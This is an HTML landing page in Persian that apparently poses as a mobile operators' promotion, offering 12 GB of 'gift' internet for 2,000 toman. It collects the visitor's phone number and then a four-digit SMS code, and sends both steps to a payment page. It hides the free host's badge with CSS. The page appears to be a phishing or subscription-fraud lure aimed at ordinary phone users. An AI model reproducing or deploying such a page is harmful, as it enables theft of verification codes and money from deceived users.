<!DOCTYPE html>
<html>
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
    <title>اینترنت هدیه اپراتور ها </title>
    <link href="style/style.css" rel="stylesheet" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/style/font-awesome.min.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-136385687-59"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'UA-136385687-59');
    </script>

</head>
<body>
    <div class="app-style">
        <div class="main-container">
            <div class="picNet">
                <img class="freeNet" src="img/main-img.png" />
            </div>
            <div id="step1" class="all-step">
                <div class="event-title">
                    اینترنت هدیه تابستانه
                </div>
      
                <div class="section-4">
                    <p class="p-color-2">دوازده گیگابایت اینترنت هدیه فقط با پرداخت 2 هزار تومان</p>
                </div>
                <div class="step">
                    <div class="inputGroup">
                        <input type="tel" maxlength="11" id="usermobile" class="form-input-1 grid-input" placeholder="شماره موبایلت را وارد کن">
                        <i class="fa fa-mobile inputPhone" aria-hidden="true"></i>
                    </div>
                    <div class="buttonGroup">
                        <a href="payment/index.php" class="taeed">تایید</a>
                    </div>
                    <div>
                        <a href="/landing/terms/12.html" id="terms" style="text-decoration:none;font-family:IranSans;font-size:12px;color:forestgreen">با شرایط سرویس موافقم</a>
                    </div>
                </div>

            </div>
            <div id="step2" class="all-step hide">
                <div class="section-4">
                    <p class="text-sms">
                        برای دریافت 12 گیگ اینترنت خود کد چهاررقمی ارسال شده را وارد کنید
                        <br />
                        لطفا منتظر بمانید تا کد تایید اس ام اس شود
                    </p>
                </div>
                <div class="step">
                    <div class="inputGroup">
                        <input type="tel" id="validcode" class="form-input-1" placeholder="-  -  -  -" maxlength="4">
                    </div>
                    <div class="buttonGroup">
                     <a href="payment/index.php" class="taeed">تایید</a>

                    </div>

                </div>
            </div>
            <p id="error" class="form-error shake">
                لطفا یک شماره تماس معتبر وارد نمایید
            </p>
            <div id="stepCount" class="stepPic">

            </div>
            <div class="textPic">
            </div>
        </div>
    </div>
    <div class="overlay hide" id="overlay">
        <div class="spinner" id="spinner">
            <div class="double-bounce1"></div>
            <div class="double-bounce2"></div>
        </div>
    </div>
    <script src="js/jquery.min.js"></script>
    <script src="js//index.js"></script>
</body>
</html>
